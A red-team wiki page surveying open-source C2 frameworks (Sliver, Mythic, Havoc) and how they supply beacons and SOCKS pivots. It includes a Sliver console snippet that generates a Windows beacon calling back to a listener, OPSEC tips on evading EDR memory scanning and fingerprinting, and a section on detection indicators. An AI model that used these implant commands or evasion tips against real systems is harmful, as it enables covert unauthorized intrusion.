---
title: "Modern C2 frameworks (Sliver, Mythic, Havoc)"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [c2, red-team, tradecraft, evasion, sliver, mythic, havoc]
---

# Modern C2 frameworks

[[cobalt-strike]] is the commercial reference and [[meterpreter]] the classic
free payload, but a lot of real red-team work now runs on **open-source C2
frameworks** — for cost, for source-level customization (change the indicators
before the blue team has signatures), and because the mechanics generalize.
This page maps the current landscape and how each fits the tradecraft in this
wiki. They all deliver the same two things the rest of the wiki assumes: a
**beacon** ([[beaconing]]) and a **SOCKS pivot** to run AD tooling through
([[pivoting-and-tunneling]], [[c2-and-pivoting-ad]]).

## The frameworks

### Sliver (BishopFox) — the open-source default

- **Go** implants, cross-platform (Windows/Linux/macOS), single static binary
  server. Transports: **mTLS, WireGuard, HTTP(S), DNS**. **Beacon** (async,
  low-and-slow) and **session** (interactive) modes.
- **Armory** extension ecosystem (BOFs, .NET assemblies via `sharpsh`,
  situational-awareness packs). Per-implant **profiles**, staged or stageless.
- Strong "just works" choice: scriptable, multiplayer, actively developed.

```bash
# server console
mtls --lhost 10.10.10.10
generate beacon --mtls 10.10.10.10 --os windows --arch amd64 --seconds 60 --jitter 30
sessions ; use <id> ; socks5 start        # SOCKS pivot for proxychains
```

### Mythic (@its_a_feature_) — agent-agnostic, collaborative

- A **framework, not one agent**: a Dockerized server + web UI that hosts many
  **interchangeable agents**, so you pick the implant per target:
  **Apollo** (.NET, Windows, BOF/assembly-friendly), **Poseidon** (Go,
  cross-platform), **Athena**, **Merlin** (HTTP/2, HTTP/3). Great for team ops
  and mixing agents in one operation with unified logging/tasking.

### Havoc (@C5pider) — evasion-forward, CS-like

- Modern C2 in C/ASM/Go with the **Demon** agent. Built for **evasion**: **sleep
  obfuscation** (Ekko/Foliage/Zilean), **indirect syscalls**, stack spoofing,
  return-address spoofing. The go-to free "feels like Cobalt Strike, tuned for
  memory-scanner evasion."

### Also in the field

- **Brute Ratel / Nighthawk** — commercial, heavily evasion-engineered.
- **Empire / Covenant** — older .NET/PowerShell C2s (still seen, more signatured).
- **Cobalt Strike** ([[cobalt-strike]]) / **Metasploit-Meterpreter**
  ([[meterpreter]]) — the commercial standard and the classic baseline.

## How they plug into everything else here

Regardless of framework the operating model is identical:

- The implant is the **beacon** — its heartbeat, jitter, and callback shape are
  what the defender hunts ([[beaconing]]).
- It exposes **SOCKS**, and you run Impacket/Certipy/[[netexec]]/[[rusthound]]
  through it ([[pivoting-and-tunneling]], [[c2-and-pivoting-ad]]) — tooling stays
  off the endpoint.
- On-host post-ex (BOFs, inline .NET) rides [[process-injection]] and must clear
  [[amsi]] / [[etw]] and dodge [[defense-evasion-ad]] telemetry.

## Red-team notes (OPSEC)

- **Defaults get you caught.** Every framework ships fingerprintable defaults:
  self-signed certs, **JARM/JA3(S)** TLS signatures, default HTTP profiles, and —
  for CS-lineage tools — **default named-pipe names** and sleep patterns. Change
  the profile/cert/pipe names before use; open source is an advantage precisely
  because you *can*.
- **Sleep obfuscation is the differentiator now.** Havoc's Ekko/Foliage (and CS
  sleepmask) encrypt the beacon in memory between callbacks to beat periodic
  memory scanners (BeaconHunter, Moneta, PE-sieve). If your target has EDR doing
  memory scanning, pick/configure a framework that supports it.
- **Match transport to egress.** DNS/HTTPS-over-443 to a **redirector** blends;
  a raw novel port/IP does not — same lesson as [[pivoting-and-tunneling]].
- **One egress.** Route pivot tunnels through the existing implant channel rather
  than opening a second parallel connection out.

## Detection

- **Network**: JARM/JA3S TLS fingerprints of default profiles, beacon
  periodicity + jitter ([[beaconing]]), DNS-C2 volume/entropy, known redirector
  patterns.
- **Host**: default **named pipes**, sacrificial/spawned post-ex processes,
  **unbacked/RX memory regions** and sleeping-beacon memory scans, AMSI/ETW
  tampering ([[amsi]] / [[etw]]), suspicious module loads — surfaced by
  [[sysmon]] + [[sigma]].
- **Behavioral**: the pivot itself — an internal host suddenly proxying LDAP/SMB/
  Kerberos to the DC ([[c2-and-pivoting-ad]]).

## Links

- [[beaconing]] — the callback model all of these implement
- [[cobalt-strike]] / [[meterpreter]] — the commercial standard and classic payload
- [[pivoting-and-tunneling]] / [[c2-and-pivoting-ad]] — SOCKS pivoting the implant provides
- [[process-injection]] / [[amsi]] / [[etw]] — on-host post-ex and evasion
- [[defense-evasion-ad]] — operating quietly overall
- [[sysmon]] / [[sigma]] — the host telemetry they're tuned against

## References

- [Sliver (BishopFox)](https://github.com/BishopFox/sliver)
- [Mythic](https://github.com/its-a-feature/Mythic)
- [Havoc](https://github.com/HavocFramework/Havoc)
